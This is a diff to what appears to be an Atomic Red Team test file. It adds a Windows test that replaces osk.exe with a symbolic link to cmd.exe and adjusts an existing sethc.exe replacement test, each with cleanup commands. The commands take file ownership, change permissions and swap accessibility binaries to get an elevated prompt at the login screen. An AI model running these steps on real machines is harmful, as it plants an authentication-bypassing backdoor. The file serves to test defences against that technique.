@@ -54,11 +54,36 @@ atomic_tests:
   - windows
   executor:
     command: |
-      copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe
+      IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
       takeown /F C:\Windows\System32\sethc.exe /A
       icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
       copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
     cleanup_command: |
       copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
+    name: command_prompt
+    elevation_required: true
+- name: Create Symbolic Link From osk.exe to cmd.exe
+  auto_generated_guid: 51ef369c-5e87-4f33-88cd-6d61be63edf2
+  description: |
+    Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd )
+      takeown /F %windir%\System32\osk.exe /A
+      icacls %windir%\System32\osk.exe /grant Administrators:F /t
+      del %windir%\System32\osk.exe
+      mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
+    cleanup_command: |
+      takeown /F %windir%\System32\osk.exe /A
+      icacls %windir%\System32\osk.exe /grant Administrators:F /t
+      del %windir%\System32\osk.exe
+      copy /Y %windir%\System32\osk.exe.bak %windir%\System32\osk.exe
+      icacls %windir%\system32\osk.exe /inheritance:d
+      icacls %windir%\system32\osk.exe /setowner "NT SERVICE\TrustedInstaller"
+      icacls %windir%\System32\osk.exe /grant "NT SERVICE\TrustedInstaller":F /t
+      icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX
+      icacls %windir%\system32\osk.exe /grant:r Administrators:RX
     name: command_prompt
     elevation_required: true
